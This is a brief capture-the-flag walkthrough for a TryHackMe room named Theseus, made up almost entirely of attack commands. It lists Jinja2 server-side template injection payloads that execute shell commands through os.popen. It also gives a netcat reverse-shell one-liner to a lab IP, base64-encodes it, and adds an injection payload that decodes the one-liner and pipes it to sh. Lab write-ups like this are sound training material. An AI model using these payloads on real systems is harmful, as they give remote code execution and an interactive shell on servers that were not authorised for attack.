# TryHackMe room Theseus

## Task: What is the Labyrinth flag?
### YouTube video walkthrough: 
[YouTube video 1]((https://youtu.be/HdeJ_-U6RZI))

### Coomand used on the video:

```
{{lipsum.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('ls /').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Reverse Shell:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.70.253 1234 >/tmp/f

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.70.253 1234 >/tmp/f' | base64 

{{lipsum.__globals__['os'].popen('echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjMz
LjE4IDEyMzQgPi90bXAvZgo= | base64 -d | sh').read()}}
```
